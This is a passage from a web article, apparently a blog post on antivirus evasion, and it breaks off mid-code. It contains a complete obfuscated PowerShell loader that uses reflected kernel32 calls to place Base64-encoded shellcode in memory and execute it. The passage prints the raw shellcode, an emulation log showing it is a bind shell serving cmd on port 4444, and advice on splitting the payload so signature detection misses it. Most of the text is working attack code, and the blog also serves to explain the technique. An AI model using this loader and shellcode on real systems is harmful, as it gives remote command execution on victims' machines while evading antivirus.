<span class=line><span style=color:#d73a49;--shiki-dark:#F97583>if</span><span style=color:#24292e;--shiki-dark:#E1E4E8> (([</span><span style=color:#d73a49;--shiki-dark:#F97583>System.Runtime.InteropServices.Marshal</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]::GetDelegateForFunctionPointer((paE kernel32.dll VirtualProtect)</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> (vXZ </span><span style=color:#d73a49;--shiki-dark:#F97583>@</span><span style=color:#24292e;--shiki-dark:#E1E4E8>([</span><span style=color:#d73a49;--shiki-dark:#F97583>IntPtr</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>UIntPtr</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>UInt32</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>UInt32</span><span style=color:#24292e;--shiki-dark:#E1E4E8>].MakeByRefType()) ([</span><span style=color:#d73a49;--shiki-dark:#F97583>Bool</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]))).Invoke($dQUM</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>Uint32</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]$sSYI.Length</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#005cc5;--shiki-dark:#79B8FF> 0x10</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>Ref</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]$f21aS)) </span><span style=color:#d73a49;--shiki-dark:#F97583>-eq</span><span style=color:#005cc5;--shiki-dark:#79B8FF> $true</span><span style=color:#24292e;--shiki-dark:#E1E4E8>) {</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>        $asr </span><span style=color:#d73a49;--shiki-dark:#F97583>=</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>System.Runtime.InteropServices.Marshal</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]::GetDelegateForFunctionPointer((paE kernel32.dll CreateThread)</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> (vXZ </span><span style=color:#d73a49;--shiki-dark:#F97583>@</span><span style=color:#24292e;--shiki-dark:#E1E4E8>([</span><span style=color:#d73a49;--shiki-dark:#F97583>IntPtr</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>UInt32</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>IntPtr</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>IntPtr</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>UInt32</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>IntPtr</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]) ([</span><span style=color:#d73a49;--shiki-dark:#F97583>IntPtr</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]))).Invoke([</span><span style=color:#d73a49;--shiki-dark:#F97583>IntPtr</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]::Zero</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#005cc5;--shiki-dark:#79B8FF>0</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8>$dQUM</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8>[</span><span style=color:#d73a49;--shiki-dark:#F97583>IntPtr</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]::Zero</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#005cc5;--shiki-dark:#79B8FF>0</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8>[</span><span style=color:#d73a49;--shiki-dark:#F97583>IntPtr</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]::Zero)</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>        [</span><span style=color:#d73a49;--shiki-dark:#F97583>System.Runtime.InteropServices.Marshal</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]::GetDelegateForFunctionPointer((paE kernel32.dll WaitForSingleObject)</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> (vXZ </span><span style=color:#d73a49;--shiki-dark:#F97583>@</span><span style=color:#24292e;--shiki-dark:#E1E4E8>([</span><span style=color:#d73a49;--shiki-dark:#F97583>IntPtr</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>Int32</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]))).Invoke($asr</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#005cc5;--shiki-dark:#79B8FF>0xffffffff</span><span style=color:#24292e;--shiki-dark:#E1E4E8>) </span><span style=color:#d73a49;--shiki-dark:#F97583>|</span><span style=color:#005cc5;--shiki-dark:#79B8FF> Out-Null</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>}</span></span>
<span class=line></span></code></pre><span class="duration-300 absolute transition-opacity right-3 text-muted-foreground top-3 language select-none text-sm">powershell</span><button class="duration-300 absolute rounded bg-primary-foreground border border-border box-content copy opacity-0 p-1 right-3 text-muted-foreground top-3 transition-opacity" data-code="function paE {
        Param ($jJ5, $a_TA6)
        $pRE8k = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\&#x27;)[-1].Equals(&#x27;System.dll&#x27;) }).GetType(&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;)

        return $pRE8k.GetMethod(&#x27;GetProcAddress&#x27;, [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($pRE8k.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($jJ5)))), $a_TA6))
}

function vXZ {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $cpn5o,
                [Parameter(Position = 1)] [Type] $ycb = [Void]
        )

        $aGf = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;ReflectedDelegate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDelegateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate])
        $aGf.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]::Standard, $cpn5o).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)
        $aGf.DefineMethod(&#x27;Invoke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $ycb, $cpn5o).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)

        return $aGf.CreateType()
}

[Byte[]]$sSYI = [System.Convert]::FromBase64String(&#x22;/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcAAAAAEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1VBQTTHJTTHASP/ASInCSP/ASInBQbrqD9/g/9VIicdqEEFYTIniSIn5QbrC2zdn/9VIMdJIiflBurfpOP//1U0xwEgx0kiJ+UG6dOw74f/VSIn5SInHQbp1bk1h/9VIgcSgAgAASbhjbWQAAAAAAEFQQVBIieJXV1dNMcBqDVlBUOL8ZsdEJFQBAUiNRCQYxgBoSInmVlBBUEFQQVBJ/8BBUEn/yE2JwUyJwUG6ecw/hv/VSDHSSP/Kiw5BugiHHWD/1bvwtaJWQbqmlb2d/9VIg8QoPAZ8CoD74HUFu0cTcm9qAFlBidr/1Q==&#x22;)
[Uint32]$f21aS = 0
$dQUM = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((paE kernel32.dll VirtualAlloc), (vXZ @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $sSYI.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($sSYI, 0, $dQUM, $sSYI.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((paE kernel32.dll VirtualProtect), (vXZ @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($dQUM, [Uint32]$sSYI.Length, 0x10, [Ref]$f21aS)) -eq $true) {
        $asr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((paE kernel32.dll CreateThread), (vXZ @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$dQUM,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((paE kernel32.dll WaitForSingleObject), (vXZ @([IntPtr], [Int32]))).Invoke($asr,0xffffffff) | Out-Null
}
" onclick="navigator.clipboard.writeText(this.dataset.code);
          this.classList.add(&#x27;copied&#x27;);
          setTimeout(() => this.classList.remove(&#x27;copied&#x27;), 2000)"><div class=ready><svg class=size-5><use href=/icons/code.svg#mingcute-clipboard-line></use></svg></div><div class="hidden success"><svg class=size-5><use href=/icons/code.svg#mingcute-file-check-line></use></svg></div></button></div><p><img alt="Second layer script analysis with shellcode loading" decoding=async height=353 loading=lazy src=/_astro/evasiondecrypttwo.n9tT9nDR_1W0kmk.webp width=602> <em>Analysis of the second-stage PowerShell script, showing shellcode loading and execution.</em></p><h3 id=shellcode-analysis>Shellcode Analysis<a class=anchor href=#shellcode-analysis>#</a></h3><p>The final payload is the shellcode. Analysis of this shellcode reveals its purpose, which is typically to establish a command and control (C2) channel or deploy further malware.</p><p>Raw shellcode (partial view):</p><div class="astro-code astro-code-themes github-dark github-light" style=background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8;overflow-x:auto data-language=plaintext tabindex=0><pre><code><span class=line><span>fc 48 83 e4 f0 e8 c0 00 00 00 41 51 41 50 52 51 56 48 31 d2 65 48 8b 52 60 48 8b 52 18 48 8b 52 20 48 8b 72 50 48 0f b7 4a 4a 4d 31 c9 48 31 c0 ac 3c 61 7c 02 2c 20 41 c1 c9 0d 41 01 c1 e2 ed 52 41 51 48 8b 52 20 8b 42 3c 48 01 d0 8b 80 88 00 00 00 48 85 c0 74 67 48 01 d0 50 8b 48 18 44 8b 40 20 49 01 d0 e3 56 48 ff c9 41 8b 34 88 48 01 d6 4d 31 c9 48 31 c0 ac 41 c1 c9 0d 41 01 c1 38 e0 75 f1 4c 03 4c 24 08 45 39 d1 75 d8 58 44 8b 40 24 49 01 d0 66 41 8b 0c 48 44 8b 40 1c 49 01 d0 41 8b 04 88 48 01 d0 41 58 41 58 5e 59 5a 41 58 41 59 41 5a 48 83 ec 20 41 52 ff e0 58 41 59 5a 48 8b 12 e9 57 ff ff ff 5d 49 be 77 73 32 5f 33 32 00 00 41 56 49 89 e6 48 81 ec a0 01 00 00 49 89 e5 49 bc 02 00 11 5c 00 00 00 00 41 54 49 89 e4 4c 89 f1 41 ba 4c 77 26 07 ff d5 4c 89 ea 68 01 01 00 00 59 41 ba 29 80 6b 00 ff d5 50 50 4d 31 c9 4d 31 c0 48 ff c0 48 89 c2 48 ff c0 48 89 c1 41 ba ea 0f df e0 ff d5 48 89 c7 6a 10 41 58 4c 89 e2 48 89 f9 41 ba c2 db 37 67 ff d5 48 31 d2 48 89 f9 41 ba b7 e9 38 ff ff d5 4d 31 c0 48 31 d2 48 89 f9 41 ba 74 ec 3b e1 ff d5 48 89 f9 48 89 c7 41 ba 75 6e 4d 61 ff d5 48 81 c4 a0 02 00 00 49 b8 63 6d 64 00 00 00 00 00 41 50 41 50 48 89 e2 57 57 57 4d 31 c0 6a 0d 59 41 50 e2 fc 66 c7 44 24 54 01 01 48 8d 44 24 18 c6 00 68 48 89 e6 56 50 41 50 41 50 41 50 49 ff c0 41 50 49 ff c8 4d 89 c1 4c 89 c1 41 ba 79 cc 3f 86 ff d5 48 31 d2 48 ff ca 8b 0e 41 ba 08 87 1d 60 ff d5 bb f0 b5 a2 56 41 ba a6 95 bd 9d ff d5 48 83 c4 28 3c 06 7c 0a 80 fb e0 75 05 bb 47 13 72 6f 6a 00 59 41 89 da ff d5</span></span>
<span class=line><span></span></span></code></pre><span class="duration-300 absolute transition-opacity right-3 text-muted-foreground top-3 language select-none text-sm">plaintext</span><button class="duration-300 absolute rounded bg-primary-foreground border border-border box-content copy opacity-0 p-1 right-3 text-muted-foreground top-3 transition-opacity" data-code="fc 48 83 e4 f0 e8 c0 00 00 00 41 51 41 50 52 51 56 48 31 d2 65 48 8b 52 60 48 8b 52 18 48 8b 52 20 48 8b 72 50 48 0f b7 4a 4a 4d 31 c9 48 31 c0 ac 3c 61 7c 02 2c 20 41 c1 c9 0d 41 01 c1 e2 ed 52 41 51 48 8b 52 20 8b 42 3c 48 01 d0 8b 80 88 00 00 00 48 85 c0 74 67 48 01 d0 50 8b 48 18 44 8b 40 20 49 01 d0 e3 56 48 ff c9 41 8b 34 88 48 01 d6 4d 31 c9 48 31 c0 ac 41 c1 c9 0d 41 01 c1 38 e0 75 f1 4c 03 4c 24 08 45 39 d1 75 d8 58 44 8b 40 24 49 01 d0 66 41 8b 0c 48 44 8b 40 1c 49 01 d0 41 8b 04 88 48 01 d0 41 58 41 58 5e 59 5a 41 58 41 59 41 5a 48 83 ec 20 41 52 ff e0 58 41 59 5a 48 8b 12 e9 57 ff ff ff 5d 49 be 77 73 32 5f 33 32 00 00 41 56 49 89 e6 48 81 ec a0 01 00 00 49 89 e5 49 bc 02 00 11 5c 00 00 00 00 41 54 49 89 e4 4c 89 f1 41 ba 4c 77 26 07 ff d5 4c 89 ea 68 01 01 00 00 59 41 ba 29 80 6b 00 ff d5 50 50 4d 31 c9 4d 31 c0 48 ff c0 48 89 c2 48 ff c0 48 89 c1 41 ba ea 0f df e0 ff d5 48 89 c7 6a 10 41 58 4c 89 e2 48 89 f9 41 ba c2 db 37 67 ff d5 48 31 d2 48 89 f9 41 ba b7 e9 38 ff ff d5 4d 31 c0 48 31 d2 48 89 f9 41 ba 74 ec 3b e1 ff d5 48 89 f9 48 89 c7 41 ba 75 6e 4d 61 ff d5 48 81 c4 a0 02 00 00 49 b8 63 6d 64 00 00 00 00 00 41 50 41 50 48 89 e2 57 57 57 4d 31 c0 6a 0d 59 41 50 e2 fc 66 c7 44 24 54 01 01 48 8d 44 24 18 c6 00 68 48 89 e6 56 50 41 50 41 50 41 50 49 ff c0 41 50 49 ff c8 4d 89 c1 4c 89 c1 41 ba 79 cc 3f 86 ff d5 48 31 d2 48 ff ca 8b 0e 41 ba 08 87 1d 60 ff d5 bb f0 b5 a2 56 41 ba a6 95 bd 9d ff d5 48 83 c4 28 3c 06 7c 0a 80 fb e0 75 05 bb 47 13 72 6f 6a 00 59 41 89 da ff d5
" onclick="navigator.clipboard.writeText(this.dataset.code);
          this.classList.add(&#x27;copied&#x27;);
          setTimeout(() => this.classList.remove(&#x27;copied&#x27;), 2000)"><div class=ready><svg class=size-5><use href=/icons/code.svg#mingcute-clipboard-line></use></svg></div><div class="hidden success"><svg class=size-5><use href=/icons/code.svg#mingcute-file-check-line></use></svg></div></button></div><p>Emulation with tools like <code>speakeasy</code> can reveal its behavior:</p><div class="astro-code astro-code-themes github-dark github-light" style=background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8;overflow-x:auto data-language=plaintext tabindex=0><pre><code><span class=line><span>speakeasy -t shellcode.bin  -r -a x64 </span></span>
<span class=line><span>* exec: shellcode</span></span>
<span class=line><span>0x10fe: 'kernel32.LoadLibraryA("ws2_32")' -> 0x78c00000</span></span>
<span class=line><span>0x110f: 'ws2_32.WSAStartup(0x101, 0x1203e08)' -> 0x0</span></span>
<span class=line><span>0x112b: 'ws2_32.WSASocketA("AF_INET", "SOCK_STREAM", 0x0, 0x0, 0x0, 0x0)' -> 0x4</span></span>
<span class=line><span>0x1140: 'ws2_32.bind(0x4, "0.0.0.0:4444", 0x10)' -> 0x0</span></span>
<span class=line><span>0x114e: 'ws2_32.listen(0x4, 0x0)' -> 0x0</span></span>
<span class=line><span>0x115f: 'ws2_32.accept(0x4, 0x0, 0x0)' -> 0x8</span></span>
<span class=line><span>0x116d: 'ws2_32.closesocket(0x4)' -> 0x0</span></span>
<span class=line><span>0x11c2: 'kernel32.CreateProcessA(0x0, "cmd", 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1203f38, 0x1203f20)' -> 0x1</span></span>
<span class=line><span>0x11d2: 'kernel32.WaitForSingleObject(0x220, 0xffffffffffffffff)' -> 0x0</span></span>
<span class=line><span>0x11df: 'kernel32.GetVersion()' -> 0x1db10106</span></span>
<span class=line><span>0x11f9: 'kernel32.ExitProcess(0x0)' -> 0x0</span></span>
<span class=line><span>* Finished emulating</span></span>
<span class=line><span></span></span></code></pre><span class="duration-300 absolute transition-opacity right-3 text-muted-foreground top-3 language select-none text-sm">plaintext</span><button class="duration-300 absolute rounded bg-primary-foreground border border-border box-content copy opacity-0 p-1 right-3 text-muted-foreground top-3 transition-opacity" data-code="speakeasy -t shellcode.bin  -r -a x64 
* exec: shellcode
0x10fe: &#x27;kernel32.LoadLibraryA(&#x22;ws2_32&#x22;)&#x27; -> 0x78c00000
0x110f: &#x27;ws2_32.WSAStartup(0x101, 0x1203e08)&#x27; -> 0x0
0x112b: &#x27;ws2_32.WSASocketA(&#x22;AF_INET&#x22;, &#x22;SOCK_STREAM&#x22;, 0x0, 0x0, 0x0, 0x0)&#x27; -> 0x4
0x1140: &#x27;ws2_32.bind(0x4, &#x22;0.0.0.0:4444&#x22;, 0x10)&#x27; -> 0x0
0x114e: &#x27;ws2_32.listen(0x4, 0x0)&#x27; -> 0x0
0x115f: &#x27;ws2_32.accept(0x4, 0x0, 0x0)&#x27; -> 0x8
0x116d: &#x27;ws2_32.closesocket(0x4)&#x27; -> 0x0
0x11c2: &#x27;kernel32.CreateProcessA(0x0, &#x22;cmd&#x22;, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1203f38, 0x1203f20)&#x27; -> 0x1
0x11d2: &#x27;kernel32.WaitForSingleObject(0x220, 0xffffffffffffffff)&#x27; -> 0x0
0x11df: &#x27;kernel32.GetVersion()&#x27; -> 0x1db10106
0x11f9: &#x27;kernel32.ExitProcess(0x0)&#x27; -> 0x0
* Finished emulating
" onclick="navigator.clipboard.writeText(this.dataset.code);
          this.classList.add(&#x27;copied&#x27;);
          setTimeout(() => this.classList.remove(&#x27;copied&#x27;), 2000)"><div class=ready><svg class=size-5><use href=/icons/code.svg#mingcute-clipboard-line></use></svg></div><div class="hidden success"><svg class=size-5><use href=/icons/code.svg#mingcute-file-check-line></use></svg></div></button></div><p><strong>Summary of Shellcode Behavior:</strong> The shellcode executes the following actions:</p><ol><li>Loads <code>ws2_32.dll</code> (Windows Sockets API).</li><li>Initializes Winsock.</li><li>Creates a TCP socket.</li><li>Binds the socket to listen on all available network interfaces on port 4444.</li><li>Accepts an incoming connection on this port.</li><li>Closes the original listening socket.</li><li>Creates a new <code>cmd.exe</code> process, effectively providing a command prompt.</li><li>Waits for the <code>cmd.exe</code> process to terminate.</li><li>Retrieves the operating system version (likely for telemetry or compatibility checks).</li><li>Exits the current process.</li></ol><p>In essence, this shellcode implements a bind shell: it listens on port 4444 and provides an interactive command prompt to any client that connects to it.</p><h3 id=further-evasion-splitting-the-payload>Further Evasion: Splitting the Payload<a class=anchor href=#further-evasion-splitting-the-payload>#</a></h3><p>To make signature-based detection more difficult, the Base64 encoded shellcode within the PowerShell script can be split into multiple string variables. These variables are then concatenated at runtime before the shellcode is decoded and executed.</p><div class="astro-code astro-code-themes github-dark github-light" style=background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8;overflow-x:auto data-language=powershell tabindex=0><pre><code><span class=line><span style=color:#d73a49;--shiki-dark:#F97583>function</span><span style=color:#6f42c1;--shiki-dark:#B392F0> paE</span><span style=color:#24292e;--shiki-dark:#E1E4E8> {</span></span>
<span class=line><span style=color:#d73a49;--shiki-dark:#F97583>        Param</span><span style=color:#24292e;--shiki-dark:#E1E4E8> ($jJ5</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> $a_TA6)</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>        $pRE8k </span><span style=color:#d73a49;--shiki-dark:#F97583>=</span><span style=color:#24292e;--shiki-dark:#E1E4E8> ([</span><span style=color:#d73a49;--shiki-dark:#F97583>AppDomain</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]::CurrentDomain.GetAssemblies() </span><span style=color:#d73a49;--shiki-dark:#F97583>|</span><span style=color:#005cc5;--shiki-dark:#79B8FF> Where-Object</span><span style=color:#24292e;--shiki-dark:#E1E4E8> { </span><span style=color:#005cc5;--shiki-dark:#79B8FF>$_</span><span style=color:#24292e;--shiki-dark:#E1E4E8>.GlobalAssemblyCache </span><span style=color:#d73a49;--shiki-dark:#F97583>-And</span><span style=color:#005cc5;--shiki-dark:#79B8FF> $_</span><span style=color:#24292e;--shiki-dark:#E1E4E8>.Location.Split(</span><span style=color:#032f62;--shiki-dark:#9ECBFF>'\'</span><span style=color:#24292e;--shiki-dark:#E1E4E8>)[</span><span style=color:#005cc5;--shiki-dark:#79B8FF>-1</span><span style=color:#24292e;--shiki-dark:#E1E4E8>].Equals(</span><span style=color:#032f62;--shiki-dark:#9ECBFF>'System.dll'</span><span style=color:#24292e;--shiki-dark:#E1E4E8>) }).GetType(</span><span style=color:#032f62;--shiki-dark:#9ECBFF>'Microsoft.Win32.UnsafeNativeMethods'</span><span style=color:#24292e;--shiki-dark:#E1E4E8>)</span></span>
<span class=line></span>
<span class=line><span style=color:#d73a49;--shiki-dark:#F97583>        return</span><span style=color:#24292e;--shiki-dark:#E1E4E8> $pRE8k.GetMethod(</span><span style=color:#032f62;--shiki-dark:#9ECBFF>'GetProcAddress'</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>Type</span><span style=color:#24292e;--shiki-dark:#E1E4E8>[]]</span><span style=color:#d73a49;--shiki-dark:#F97583>@</span><span style=color:#24292e;--shiki-dark:#E1E4E8>([</span><span style=color:#d73a49;--shiki-dark:#F97583>System.Runtime.InteropServices.HandleRef</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>String</span><span style=color:#24292e;--shiki-dark:#E1E4E8>])).Invoke(</span><span style=color:#005cc5;--shiki-dark:#79B8FF>$null</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#d73a49;--shiki-dark:#F97583> @</span><span style=color:#24292e;--shiki-dark:#E1E4E8>([</span><span style=color:#d73a49;--shiki-dark:#F97583>System.Runtime.InteropServices.HandleRef</span><span style=color:#24292e;--shiki-dark:#E1E4E8>](</span><span style=color:#005cc5;--shiki-dark:#79B8FF>New-Object</span><span style=color:#24292e;--shiki-dark:#E1E4E8> System.Runtime.InteropServices.HandleRef((</span><span style=color:#005cc5;--shiki-dark:#79B8FF>New-Object</span><span style=color:#24292e;--shiki-dark:#E1E4E8> IntPtr)</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> ($pRE8k.GetMethod(</span><span style=color:#032f62;--shiki-dark:#9ECBFF>'GetModuleHandle'</span><span style=color:#24292e;--shiki-dark:#E1E4E8>)).Invoke(</span><span style=color:#005cc5;--shiki-dark:#79B8FF>$null</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#d73a49;--shiki-dark:#F97583> @</span><span style=color:#24292e;--shiki-dark:#E1E4E8>($jJ5))))</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> $a_TA6))</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>}</span></span>
<span class=line></span>
<span class=line><span style=color:#d73a49;--shiki-dark:#F97583>function</span><span style=color:#6f42c1;--shiki-dark:#B392F0> vXZ</span><span style=color:#24292e;--shiki-dark:#E1E4E8> {</span></span>
<span class=line><span style=color:#d73a49;--shiki-dark:#F97583>        Param</span><span style=color:#24292e;--shiki-dark:#E1E4E8> (</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>                [</span><span style=color:#005cc5;--shiki-dark:#79B8FF>Parameter</span><span style=color:#24292e;--shiki-dark:#E1E4E8>(</span><span style=color:#e36209;--shiki-dark:#FFAB70>Position</span><span style=color:#d73a49;--shiki-dark:#F97583> =</span><span style=color:#005cc5;--shiki-dark:#79B8FF> 0</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#e36209;--shiki-dark:#FFAB70> Mandatory</span><span style=color:#d73a49;--shiki-dark:#F97583> =</span><span style=color:#005cc5;--shiki-dark:#79B8FF> $True</span><span style=color:#24292e;--shiki-dark:#E1E4E8>)] [</span><span style=color:#d73a49;--shiki-dark:#F97583>Type</span><span style=color:#24292e;--shiki-dark:#E1E4E8>[]] $cpn5o</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>                [</span><span style=color:#005cc5;--shiki-dark:#79B8FF>Parameter</span><span style=color:#24292e;--shiki-dark:#E1E4E8>(</span><span style=color:#e36209;--shiki-dark:#FFAB70>Position</span><span style=color:#d73a49;--shiki-dark:#F97583> =</span><span style=color:#005cc5;--shiki-dark:#79B8FF> 1</span><span style=color:#24292e;--shiki-dark:#E1E4E8>)] [</span><span style=color:#d73a49;--shiki-dark:#F97583>Type</span><span style=color:#24292e;--shiki-dark:#E1E4E8>] $ycb </span><span style=color:#d73a49;--shiki-dark:#F97583>=</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>Void</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>        )</span></span>
<span class=line></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>        $aGf </span><span style=color:#d73a49;--shiki-dark:#F97583>=</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>AppDomain</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]::CurrentDomain.DefineDynamicAssembly((</span><span style=color:#005cc5;--shiki-dark:#79B8FF>New-Object</span><span style=color:#24292e;--shiki-dark:#E1E4E8> System.Reflection.AssemblyName(</span><span style=color:#032f62;--shiki-dark:#9ECBFF>'ReflectedDelegate'</span><span style=color:#24292e;--shiki-dark:#E1E4E8>))</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>System.Reflection.Emit.AssemblyBuilderAccess</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]::Run).DefineDynamicModule(</span><span 